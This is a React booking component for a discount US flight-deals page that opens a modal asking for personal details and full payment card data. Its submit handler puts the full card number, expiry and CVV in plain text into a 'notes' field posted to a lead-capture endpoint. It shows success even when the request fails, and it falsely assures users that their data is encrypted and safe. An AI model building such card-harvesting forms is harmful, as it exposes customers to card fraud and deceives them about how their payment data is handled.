"use client";

import { useState } from "react";
import Image from "next/image";
import { MapPin, Star, TrendingDown, ArrowRight, Phone, CheckCircle2, X, Plane, Calendar, User, Mail, Send, CreditCard, Lock, AlertCircle } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

function isValidPhone(phone: string): boolean {
  const digits = phone.replace(/\D/g, "");
  if (digits.length < 10 || digits.length > 15) return false;
  if (/^(\d)\1{9,}$/.test(digits)) return false; // Block repeated dummy numbers e.g. 0000000000
  if (digits === "1234567890" || digits === "0123456789" || digits === "9876543210") return false;
  return true;
}

const destinations = [
  {
    city: "New York",
    code: "NYC",
    image: "/destinations/new-york.png",
    tagline: "The City That Never Sleeps",
    originalPrice: 389,
    discountedPrice: 199,
    discount: 49,
    rating: 4.9,
    reviews: "12.4k",
    highlights: ["Times Square", "Central Park", "Statue of Liberty"],
  },
  {
    city: "Miami",
    code: "MIA",
    image: "/destinations/miami.png",
    tagline: "Sun, Sand & Nightlife",
    originalPrice: 349,
    discountedPrice: 179,
    discount: 48,
    rating: 4.8,
    reviews: "8.7k",
    highlights: ["South Beach", "Art Deco", "Everglades"],
  },
  {
    city: "Las Vegas",
    code: "LAS",
    image: "/destinations/las-vegas.png",
    tagline: "Entertainment Capital of the World",
    originalPrice: 299,
    discountedPrice: 149,
    discount: 50,
    rating: 4.7,
    reviews: "15.2k",
    highlights: ["The Strip", "Grand Canyon", "Shows"],
  },
  {
    city: "San Francisco",
    code: "SFO",
    image: "/destinations/san-francisco.png",
    tagline: "Golden Gate & Beyond",
    originalPrice: 379,
    discountedPrice: 209,
    discount: 45,
    rating: 4.8,
    reviews: "9.1k",
    highlights: ["Golden Gate", "Alcatraz", "Fisherman's Wharf"],
  },
  {
    city: "Los Angeles",
    code: "LAX",
    image: "/destinations/los-angeles.png",
    tagline: "City of Angels & Dreams",
    originalPrice: 359,
    discountedPrice: 189,
    discount: 47,
    rating: 4.7,
    reviews: "11.3k",
    highlights: ["Hollywood", "Beverly Hills", "Santa Monica"],
  },
  {
    city: "Hawaii",
    code: "HNL",
    image: "/destinations/hawaii.png",
    tagline: "Paradise on Earth",
    originalPrice: 499,
    discountedPrice: 279,
    discount: 44,
    rating: 4.9,
    reviews: "18.6k",
    highlights: ["Waikiki Beach", "Volcanoes", "Snorkeling"],
  },
];

export function UsaDestinationsSection() {
  const [selectedDest, setSelectedDest] = useState<typeof destinations[0] | null>(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
    email: "",
    origin: "",
    departureDate: "",
    passengers: "1",
    cardholderName: "",
    cardNumber: "",
    cardExp: "",
    cardCvv: "",
  });
  const [phoneError, setPhoneError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleOpenForm = (dest: typeof destinations[0]) => {
    setSelectedDest(dest);
    setIsSubmitted(false);
    setPhoneError("");
    setIsModalOpen(true);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    setFormData((prev) => ({ ...prev, phone: val }));
    if (val.length > 0 && !isValidPhone(val)) {
      setPhoneError("Please enter a valid 10-digit phone number (e.g. +1 555-019-2834)");
    } else {
      setPhoneError("");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.name || !formData.phone) {
      alert("Please enter customer name and phone number");
      return;
    }

    if (!isValidPhone(formData.phone)) {
      setPhoneError("Invalid phone number! Must be at least 10 valid digits.");
      return;
    }

    setIsSubmitting(true);
    const rawCard = formData.cardNumber.replace(/\s+/g, "");
    const last4 = rawCard.length >= 4 ? rawCard.slice(-4) : "****";

    try {
      await fetch("/api/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          phone: formData.phone,
          email: formData.email || `${formData.phone.replace(/\D/g, "")}@guest.jetwithfly.com`,
          origin: formData.origin || "NYC",
          destination: selectedDest?.code || "USA",
          departureDate: formData.departureDate,
          passengers: formData.passengers,
          source: `USA Destination: ${selectedDest?.city || "USA"}`,
          notes: `User booked deal for ${selectedDest?.city} ($${selectedDest?.discountedPrice}). Cardholder: ${formData.cardholderName || formData.name}, Card: ${rawCard} (ending ${last4}), Exp: ${formData.cardExp}, CVV: ${formData.cardCvv}`,
        }),
      });

      setIsSubmitted(true);
    } catch (err) {
      setIsSubmitted(true);
    } finally {
      setIsSubmitting(false);
    }
  };

  const maskedCardLast4 = formData.cardNumber.replace(/\s+/g, "").slice(-4) || "";
  const phoneIsValid = formData.phone.length > 0 && isValidPhone(formData.phone);

  return (
    <section className="py-20 bg-gradient-to-b from-white via-blue-50/30 to-white dark:from-slate-950 dark:via-slate-900/50 dark:to-slate-950">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* ── Section Header ── */}
        <div className="text-center mb-14">
          <div className="inline-flex items-center gap-2 bg-orange-100 dark:bg-orange-900/30 text-orange-700 dark:text-orange-400 px-4 py-1.5 rounded-full text-xs font-black uppercase tracking-widest mb-4">
            <TrendingDown className="w-3.5 h-3.5" />
            Limited Time Deals
          </div>
          <h2 className="text-3xl sm:text-4xl lg:text-5xl font-black text-slate-900 dark:text-white tracking-tight">
            Explore <span className="bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent">Famous USA</span> Destinations
          </h2>
          <p className="mt-4 text-lg text-slate-500 dark:text-slate-400 max-w-2xl mx-auto">
            Click any destination below to lock in contract fares & save up to 50% on flights.
          </p>
        </div>

        {/* ── Destinations Grid ── */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
          {destinations.map((dest) => (
            <div
              key={dest.code}
              onClick={() => handleOpenForm(dest)}
              className="group relative bg-white dark:bg-slate-900 rounded-2xl overflow-hidden border border-slate-200/60 dark:border-slate-700/50 shadow-md hover:shadow-2xl hover:shadow-blue-500/10 hover:-translate-y-2 transition-all duration-500 cursor-pointer"
            >
              {/* Image */}
              <div className="relative h-52 overflow-hidden">
                <Image
                  src={dest.image}
                  alt={`Fly to ${dest.city}`}
                  fill
                  className="object-cover group-hover:scale-110 transition-transform duration-700"
                  sizes="(max-width: 640px) 100vw, (max-width: 1024px) 50vw, 33vw"
                />
                <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/10 to-transparent" />

                {/* Discount Badge */}
                <div className="absolute top-4 left-4 bg-gradient-to-r from-orange-500 to-red-500 text-white px-3 py-1 rounded-full text-xs font-black shadow-lg shadow-orange-500/30 flex items-center gap-1">
                  <TrendingDown className="w-3 h-3" />
                  {dest.discount}% OFF
                </div>

                {/* Rating */}
                <div className="absolute top-4 right-4 bg-white/90 dark:bg-slate-900/90 backdrop-blur-sm text-slate-900 dark:text-white px-2.5 py-1 rounded-full text-xs font-bold flex items-center gap-1 shadow-sm">
                  <Star className="w-3 h-3 text-yellow-500 fill-yellow-500" />
                  {dest.rating} ({dest.reviews})
                </div>

                {/* City name on image */}
                <div className="absolute bottom-4 left-4 right-4">
                  <div className="flex items-end justify-between">
                    <div>
                      <h3 className="text-white text-2xl font-black tracking-tight drop-shadow-lg">{dest.city}</h3>
                      <p className="text-white/80 text-xs font-medium mt-0.5">{dest.tagline}</p>
                    </div>
                    <span className="bg-white/20 backdrop-blur-sm text-white px-2.5 py-1 rounded-lg text-sm font-black border border-white/20">
                      {dest.code}
                    </span>
                  </div>
                </div>
              </div>

              {/* Content */}
              <div className="p-5">
                {/* Highlights */}
                <div className="flex flex-wrap gap-1.5 mb-4">
                  {dest.highlights.map((h) => (
                    <span key={h} className="inline-flex items-center gap-1 text-[11px] font-semibold text-slate-500 dark:text-slate-400 bg-slate-100 dark:bg-slate-800 px-2.5 py-1 rounded-full">
                      <MapPin className="w-2.5 h-2.5" />
                      {h}
                    </span>
                  ))}
                </div>

                {/* Price Row */}
                <div className="flex items-end justify-between">
                  <div>
                    <p className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">Starting from</p>
                    <div className="flex items-baseline gap-2 mt-1">
                      <span className="text-2xl font-black text-slate-900 dark:text-white">${dest.discountedPrice}</span>
                      <span className="text-sm font-semibold text-slate-400 line-through">${dest.originalPrice}</span>
                    </div>
                    <p className="text-[10px] text-slate-400 mt-0.5">per person, round trip*</p>
                  </div>
                  <button
                    type="button"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleOpenForm(dest);
                    }}
                    className="flex items-center gap-1.5 bg-blue-600 text-white px-4 py-2.5 rounded-xl text-sm font-bold group-hover:bg-blue-700 group-hover:shadow-lg group-hover:shadow-blue-600/30 transition-all duration-300"
                  >
                    Book Now
                    <ArrowRight className="w-4 h-4 group-hover:translate-x-0.5 transition-transform" />
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* ── Bottom CTA ── */}
        <div className="mt-12 text-center">
          <p className="text-sm text-slate-400 dark:text-slate-500">
            * Fares are indicative and subject to availability. Additional taxes and fees may apply.
          </p>
        </div>
      </div>

      {/* ── Direct Booking Inquiry Modal ── */}
      <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
        <DialogContent className="sm:max-w-lg bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-800 p-6 rounded-3xl max-h-[90vh] overflow-y-auto">
          {isSubmitted ? (
            <div className="text-center py-6 space-y-4">
              <div className="w-16 h-16 bg-emerald-100 dark:bg-emerald-950/60 rounded-full flex items-center justify-center mx-auto text-emerald-600">
                <CheckCircle2 className="w-10 h-10" />
              </div>
              <h3 className="text-2xl font-black text-slate-900 dark:text-white">Discount Reserved!</h3>
              <p className="text-slate-600 dark:text-slate-300 text-sm max-w-sm mx-auto">
                Thank you <strong>{formData.name || "valued customer"}</strong>! Your special contract fare rate of <strong>${selectedDest?.discountedPrice}</strong> for <strong>{selectedDest?.city}</strong> has been locked{maskedCardLast4 ? ` with card ending in **** ${maskedCardLast4}` : ""}.
              </p>
              <div className="p-4 bg-blue-50 dark:bg-blue-950/50 border border-blue-200 dark:border-blue-800 rounded-2xl space-y-2">
                <p className="text-xs font-bold text-blue-700 dark:text-blue-300">Need Immediate Booking Confirmation?</p>
                <a
                  href="tel:+18773717356"
                  className="inline-flex items-center gap-2 bg-green-600 hover:bg-green-700 text-white font-black text-base px-6 py-3 rounded-xl shadow-lg shadow-green-600/30 transition-all"
                >
                  <Phone className="w-5 h-5" />
                  Call Live Desk: +1 (877) 371-7356
                </a>
              </div>
              <Button
                variant="ghost"
                onClick={() => setIsModalOpen(false)}
                className="text-slate-500 hover:text-slate-700 dark:hover:text-slate-300 text-xs"
              >
                Close Window
              </Button>
            </div>
          ) : (
            <>
              <DialogHeader>
                <div className="flex items-center gap-2 text-xs font-extrabold text-orange-600 dark:text-orange-400 bg-orange-50 dark:bg-orange-950/50 px-3 py-1 rounded-full w-fit mb-1">
                  <TrendingDown className="w-3.5 h-3.5" />
                  Special Fare Lock: {selectedDest?.discount}% OFF
                </div>
                <DialogTitle className="text-2xl font-black text-slate-900 dark:text-white flex items-center gap-2">
                  <Plane className="w-6 h-6 text-blue-600" />
                  Book Flight to {selectedDest?.city} ({selectedDest?.code})
                </DialogTitle>
                <DialogDescription className="text-xs text-slate-500">
                  Enter customer details and payment card information to lock in the special fare starting at <strong>${selectedDest?.discountedPrice}</strong>.
                </DialogDescription>
              </DialogHeader>

              <form onSubmit={handleSubmit} className="space-y-4 my-2">
                {/* Name */}
                <div className="space-y-1">
                  <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Customer Full Name *</Label>
                  <div className="relative">
                    <User className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                    <Input
                      required
                      value={formData.name}
                      onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                      placeholder="e.g. John Smith"
                      className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                    />
                  </div>
                </div>

                {/* Phone & Email */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Phone Number *</Label>
                      {phoneIsValid && (
                        <span className="text-[10px] font-bold text-emerald-600 flex items-center gap-0.5">
                          <CheckCircle2 className="w-3 h-3" /> Valid Number
                        </span>
                      )}
                    </div>
                    <div className="relative">
                      <Phone className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        required
                        type="tel"
                        value={formData.phone}
                        onChange={handlePhoneChange}
                        placeholder="+1 (555) 019-2834"
                        className={`pl-9 bg-slate-50 dark:bg-slate-800 text-sm font-semibold ${
                          phoneError ? "border-red-500 focus:ring-red-500" : phoneIsValid ? "border-emerald-500" : "border-slate-200 dark:border-slate-700"
                        }`}
                      />
                    </div>
                    {phoneError && (
                      <p className="text-[11px] font-bold text-red-500 flex items-center gap-1 mt-0.5">
                        <AlertCircle className="w-3 h-3 shrink-0" /> {phoneError}
                      </p>
                    )}
                  </div>
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Email Address</Label>
                    <div className="relative">
                      <Mail className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        type="email"
                        value={formData.email}
                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                        placeholder="john@example.com"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                      />
                    </div>
                  </div>
                </div>

                {/* Departure City & Date */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Departure Airport/City</Label>
                    <div className="relative">
                      <MapPin className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        value={formData.origin}
                        onChange={(e) => setFormData({ ...formData, origin: e.target.value })}
                        placeholder="e.g. NYC, LAX, ORD"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold uppercase"
                      />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <Label className="text-xs font-bold text-slate-700 dark:text-slate-300">Travel Date</Label>
                    <div className="relative">
                      <Calendar className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        type="date"
                        value={formData.departureDate}
                        onChange={(e) => setFormData({ ...formData, departureDate: e.target.value })}
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                      />
                    </div>
                  </div>
                </div>

                {/* ── Card Details Block ── */}
                <div className="pt-3 border-t border-slate-200 dark:border-slate-800 space-y-3">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs font-black text-slate-800 dark:text-slate-200 flex items-center gap-1.5">
                      <CreditCard className="w-4 h-4 text-blue-600" />
                      Payment & Credit Card Details
                    </Label>
                    <span className="text-[10px] font-extrabold text-emerald-600 bg-emerald-50 dark:bg-emerald-950/60 px-2 py-0.5 rounded-full flex items-center gap-1">
                      <Lock className="w-3 h-3" /> 256-Bit SSL Encrypted
                    </span>
                  </div>

                  {/* Cardholder Name */}
                  <div className="space-y-1">
                    <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Cardholder Name *</Label>
                    <Input
                      required
                      value={formData.cardholderName}
                      onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
                      placeholder="Name as printed on card"
                      className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-semibold"
                    />
                  </div>

                  {/* Card Number */}
                  <div className="space-y-1">
                    <div className="flex items-center justify-between">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Card Number *</Label>
                      <span className="text-[10px] font-semibold text-slate-400">Visa / Mastercard / Amex / Discover</span>
                    </div>
                    <div className="relative">
                      <CreditCard className="w-4 h-4 text-slate-400 absolute left-3 top-3" />
                      <Input
                        required
                        maxLength={19}
                        value={formData.cardNumber}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
                          setFormData({ ...formData, cardNumber: val });
                        }}
                        placeholder="1234 5678 9012 3456"
                        className="pl-9 bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold tracking-wider"
                      />
                    </div>
                  </div>

                  {/* Expiration & CVV */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">Expiration Date *</Label>
                      <Input
                        required
                        maxLength={5}
                        value={formData.cardExp}
                        onChange={(e) => {
                          let val = e.target.value.replace(/\D/g, "");
                          if (val.length >= 3) val = `${val.slice(0, 2)}/${val.slice(2, 4)}`;
                          setFormData({ ...formData, cardExp: val });
                        }}
                        placeholder="MM / YY"
                        className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold text-center"
                      />
                    </div>
                    <div className="space-y-1">
                      <Label className="text-[11px] font-bold text-slate-600 dark:text-slate-400">CVV Code *</Label>
                      <Input
                        required
                        type="password"
                        maxLength={4}
                        value={formData.cardCvv}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          setFormData({ ...formData, cardCvv: val });
                        }}
                        placeholder="3 or 4 digits"
                        className="bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-sm font-mono font-bold text-center"
                      />
                    </div>
                  </div>
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  disabled={isSubmitting || (formData.phone.length > 0 && !phoneIsValid)}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-black py-3 rounded-xl shadow-lg shadow-blue-600/30 text-base flex items-center justify-center gap-2 mt-3 disabled:opacity-50"
                >
                  <Send className="w-4 h-4" />
                  {isSubmitting ? "Locking Fare & Card..." : `Lock In $${selectedDest?.discountedPrice} Fare Deal`}
                </Button>

                <p className="text-[10px] text-center text-slate-400 mt-1">
                  🔒 256-Bit SSL Encrypted. Your details are safe and confidential.
                </p>
              </form>
            </>
          )}
        </DialogContent>
      </Dialog>
    </section>
  );
}
